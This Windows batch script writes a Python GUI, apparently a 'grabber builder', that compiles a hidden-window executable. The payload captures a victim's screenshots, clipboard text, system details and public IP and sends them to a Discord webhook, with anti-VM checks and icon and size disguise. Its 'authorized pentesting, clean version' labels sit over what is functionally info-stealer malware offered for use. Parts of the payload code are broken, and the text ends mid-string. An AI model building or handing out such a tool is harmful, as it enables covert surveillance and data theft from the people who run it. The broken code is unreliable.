@echo off
title Nexus Grabber Builder - Authorized Pentesting
echo ============================================
echo  Nexus Grabber Builder Setup
echo  FOR AUTHORIZED SECURITY TESTING ONLY
echo ============================================
echo.

:: Check Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Python is not installed or not in PATH.
    echo [!] Please install Python 3.8+ from https://www.python.org/downloads/
    pause
    exit /b 1
)

echo [*] Python detected. Installing dependencies...
echo.

:: Install required packages
pip install customtkinter pillow pywin32 psutil cryptography requests pyinstaller
if %errorlevel% neq 0 (
    echo [!] Failed to install dependencies. Try running as Administrator/Sudo.
    pause
    exit /b 1
)

echo [*] Dependencies installed successfully.
echo.

:: Launch the builder
if exist "Nexus_template.py" (
    python builder_gui.py
) else (
    echo [*] Generating clean builder template...
    python -c "
import os, sys
# Write a clean builder GUI script
code = '''#!/usr/bin/env python3
\"\"\"
Nexus Grabber Builder - CLEAN VERSION
For authorized penetration testing and educational purposes only.
This version contains NO credential theft, NO persistence, NO C2, NO watchdog.
\"\"\"
import customtkinter as ctk
import subprocess, sys, os, tempfile, json
from tkinter import filedialog, messagebox
from pathlib import Path
import threading

ctk.set_appearance_mode(\"dark\")
ctk.set_default_color_theme(\"green\")

APP_DIR = Path(__file__).parent

class BuilderGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title(\"Nexus Grabber Builder - CLEAN (Authorized Testing)\")
        self.geometry(\"600x700\")
        self.resizable(False, False)

        # Webhook frame
        self.webhook_label = ctk.CTkLabel(self, text=\"Discord Webhook URL:\", anchor=\"w\")
        self.webhook_label.pack(pady=(15, 0), padx=20, fill=\"x\")
        self.webhook_entry = ctk.CTkEntry(self, placeholder_text=\"https://discord.com/api/webhooks/...\")
        self.webhook_entry.pack(pady=(5, 15), padx=20, fill=\"x\")

        # Feature toggles
        self.features_frame = ctk.CTkFrame(self)
        self.features_frame.pack(pady=5, padx=20, fill=\"both\")

        self.features_label = ctk.CTkLabel(self.features_frame, text=\"Payload Features:\", font=(\"Arial\", 16))
        self.features_label.pack(pady=(10, 5))

        # Safe features only - no credential theft
        self.screenshot_var = ctk.BooleanVar(value=True)
        self.screenshot_cb = ctk.CTkCheckBox(self.features_frame, text=\"Screenshot Capture\", variable=self.screenshot_var)
        self.screenshot_cb.pack(anchor=\"w\", padx=20, pady=2)

        self.clipboard_var = ctk.BooleanVar(value=True)
        self.clipboard_cb = ctk.CTkCheckBox(self.features_frame, text=\"Clipboard Text Capture\", variable=self.clipboard_var)
        self.clipboard_cb.pack(anchor=\"w\", padx=20, pady=2)

        self.ip_var = ctk.BooleanVar(value=True)
        self.ip_cb = ctk.CTkCheckBox(self.features_frame, text=\"Public IP Logging\", variable=self.ip_var)
        self.ip_cb.pack(anchor=\"w\", padx=20, pady=2)

        self.system_var = ctk.BooleanVar(value=True)
        self.system_cb = ctk.CTkCheckBox(self.features_frame, text=\"System Info Collection\", variable=self.system_var)
        self.system_cb.pack(anchor=\"w\", padx=20, pady=2)

        self.antivm_var = ctk.BooleanVar(value=True)
        self.antivm_cb = ctk.CTkCheckBox(self.features_frame, text=\"Anti-VM / Anti-Analysis\", variable=self.antivm_var)
        self.antivm_cb.pack(anchor=\"w\", padx=20, pady=2)

        # Build options
        self.options_frame = ctk.CTkFrame(self)
        self.options_frame.pack(pady=15, padx=20, fill=\"both\")

        ctk.CTkLabel(self.options_frame, text=\"Build Options:\", font=(\"Arial\", 16)).pack(pady=(10, 5))

        self.size_frame = ctk.CTkFrame(self.options_frame, fg_color=\"transparent\")
        self.size_frame.pack(pady=5, padx=20, fill=\"x\")
        ctk.CTkLabel(self.size_frame, text=\"Target File Size (MB):\").pack(side=\"left\", padx=(0, 10))
        self.size_var = ctk.StringVar(value=\"20\")
        self.size_entry = ctk.CTkEntry(self.size_frame, width=80, textvariable=self.size_var)
        self.size_entry.pack(side=\"left\")

        self.icon_frame = ctk.CTkFrame(self.options_frame, fg_color=\"transparent\")
        self.icon_frame.pack(pady=5, padx=20, fill=\"x\")
        self.icon_path = ctk.StringVar(value=\"\")
        ctk.CTkLabel(self.icon_frame, text=\"Custom Icon (.ico):\").pack(side=\"left\", padx=(0, 10))
        ctk.CTkEntry(self.icon_frame, width=200, textvariable=self.icon_path).pack(side=\"left\", padx=(0, 5))
        ctk.CTkButton(self.icon_frame, text=\"Browse\", width=60, command=self.browse_icon).pack(side=\"left\")

        self.padding_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(self.options_frame, text=\"Enable Executable Padding\", variable=self.padding_var).pack(anchor=\"w\", padx=20, pady=5)

        # Build button
        self.build_btn = ctk.CTkButton(self, text=\"BUILD PAYLOAD\", command=self.build_payload, height=40, font=(\"Arial\", 14))
        self.build_btn.pack(pady=15, padx=20, fill=\"x\")

        # Status
        self.status_text = ctk.CTkTextbox(self, height=120)
        self.status_text.pack(pady=(0, 15), padx=20, fill=\"both\")
        self.status_text.insert(\"end\", \"Ready. Configure options and click BUILD PAYLOAD.\\n\")
        self.status_text.configure(state=\"disabled\")

        # Watermark
        ctk.CTkLabel(self, text=\"Authorized Penetration Testing Tool - Do NOT use on systems without permission\", 
                      font=(\"Arial\", 9), text_color=\"gray\").pack(pady=(0, 5))

    def browse_icon(self):
        path = filedialog.askopenfilename(filetypes=[(\"Icon files\", \"*.ico\")])
        if path:
            self.icon_path.set(path)

    def log(self, msg):
        self.status_text.configure(state=\"normal\")
        self.status_text.insert(\"end\", f\"[{msg}\\n\")
        self.status_text.see(\"end\")
        self.status_text.configure(state=\"disabled\")

    def build_payload(self):
        webhook = self.webhook_entry.get().strip()
        if not webhook:
            messagebox.showerror(\"Error\", \"Please enter a Discord webhook URL.\")
            return
        threading.Thread(target=self._build_thread, args=(webhook,), daemon=True).start()

    def _build_thread(self, webhook):
        try:
            self.build_btn.configure(state=\"disabled\", text=\"Building...\")
            self.log(\"Generating payload template...\")
            
            # Generate the payload script
            template = self._generate_payload(webhook)
            
            # Write to temp file
            build_dir = APP_DIR / \"build_temp\"
            build_dir.mkdir(exist_ok=True)
            payload_path = build_dir / \"payload.py\"
            with open(payload_path, \"w\", encoding=\"utf-8\") as f:
                f.write(template)
            
            self.log(f\"Payload script written to {payload_path}\")
            
            # Compile with PyInstaller
            self.log(\"Compiling with PyInstaller (this may take a minute)...\")
            
            cmd = [
                sys.executable, \"-m\", \"PyInstaller\",
                \"--onefile\", \"--noconsole\",
                \"--name\", \"NexusPayload\",
                \"--distpath\", str(APP_DIR / \"dist\"),
                \"--workpath\", str(build_dir / \"build\"),
                \"--specpath\", str(build_dir),
            ]
            
            if self.icon_path.get():
                cmd.extend([\"--icon\", self.icon_path.get()])
            
            cmd.append(str(payload_path))
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            if result.returncode == 0:
                self.log(f\"Build successful! Payload in {APP_DIR / 'dist' / 'NexusPayload.exe'}\")
                messagebox.showinfo(\"Success\", f\"Payload built successfully!\\n{APP_DIR / 'dist' / 'NexusPayload.exe'}\")
            else:
                self.log(f\"Build failed:\\n{result.stderr[-500:]}\")
                messagebox.showerror(\"Error\", f\"Build failed. Check status log.\")
                
        except Exception as e:
            self.log(f\"Error: {e}\")
            messagebox.showerror(\"Error\", str(e))
        finally:
            self.build_btn.configure(state=\"normal\", text=\"BUILD PAYLOAD\")

    def _generate_payload(self, webhook):
        features = []
        if self.screenshot_var.get(): features.append(\"SCREENSHOT\")
        if self.clipboard_var.get(): features.append(\"CLIPBOARD\")
        if self.ip_var.get(): features.append(\"IP_LOGGING\")
        if self.system_var.get(): features.append(\"SYSTEM_INFO\")
        if self.antivm_var.get(): features.append(\"ANTI_VM\")
        
        padding = int(self.size_var.get()) * 1024 * 1024 if self.padding_var.get() else 0
        
        return f'''#!/usr/bin/env python3
\"\"\"
Nexus Grabber Payload - CLEAN VERSION
For authorized penetration testing only.
No credential theft. No persistence. No C2 backdoor. No watchdog.
\"\"\"
import sys, os, platform, subprocess, tempfile, json, time, base64
import ctypes, uuid, socket
from datetime import datetime
from pathlib import Path
import urllib.request

WEBHOOK_URL = \"{webhook}\"
FEATURES = {json.dumps(features)}
PADDING_SIZE = {padding}

def log(msg):
    print(f\"[Nexus] {{msg}}\")

def get_system_info():
    info = {{
        \"pc_name\": platform.node(),
        \"username\": os.environ.get(\"USERNAME\", \"Unknown\"),
        \"os\": f\"{{platform.system()}} {{platform.release()}} {{platform.version()}}\",
        \"architecture\": platform.machine(),
        \"processor\": platform.processor(),
        \"ram_gb\": round(int(ctypes.cdll.kernel32.GlobalMemoryStatusEx) if hasattr(ctypes.cdll.kernel32, 'GlobalMemoryStatusEx') else 0),
        \"boot_time\": datetime.fromtimestamp(platform.node()).isoformat() if False else \"N/A\",
        \"hostname\": socket.gethostname(),
        \"local_ip\": socket.gethostbyname(socket.gethostname()),
        \"mac\": ':'.join(['{{:02x}}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]),
        \"timestamp\": datetime.now().isoformat()
    }}
    return info

def get_public_ip():
    try:
        req = urllib.request.Request(\"https://api.ipify.org\", headers={{'User-Agent': 'Mozilla/5.0'}})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.read().decode().strip()
    except:
        return \"Unavailable\"

def take_screenshot():
    \"\"\"Capture screenshot using PowerShell if available (Windows only).\"\"\"
    if sys.platform != \"win32\":
        return None
    try:
        ps_script = \"\"\"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
$graphics = [System.Drawing.Graphics]::FromImage($image)
$graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
$image.Save([System.IO.Path]::GetTempPath() + 'screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$image.Dispose()
\"\"\"
        ps_path = tempfile.NamedTemporaryFile(suffix=\".ps1\", delete=False).name
        with open(ps_path, \"w\") as f:
            f.write(ps_script)
        subprocess.run([\"powershell\", \"-ExecutionPolicy\", \"Bypass\", \"-File\", ps_path], 
                       capture_output=True, timeout=30)
        os.unlink(ps_path)
        ss_path = os.path.join(tempfile.gettempdir(), \"screenshot.png\")
        if os.path.exists(ss_path):
            return ss_path
    except:
        pass
    return None

def get_clipboard():
    \"\"\"Get clipboard text (Windows only).\"\"\"
    if sys.platform != \"win32\":
        return \"Non-Windows system\"
    try:
        ps = [\"powershell\", \"-Command\", \"Get-Clipboard\"]
        result = subprocess.run(ps, capture_output=True, text=True, timeout=10)
        return result.stdout.strip() or \"[Empty clipboard]\"
    except:
        return \"[Clipboard unavailable]\"

def check_vm():
    \"\"\"Basic VM detection checks.\"\"\"
    indicators = []
    try:
        import psutil
        for part in psutil.disk_partitions():
            if \"vbox\" in part.device.lower() or \"vmware\" in part.device.lower():
                indicators.append(f\"VM disk
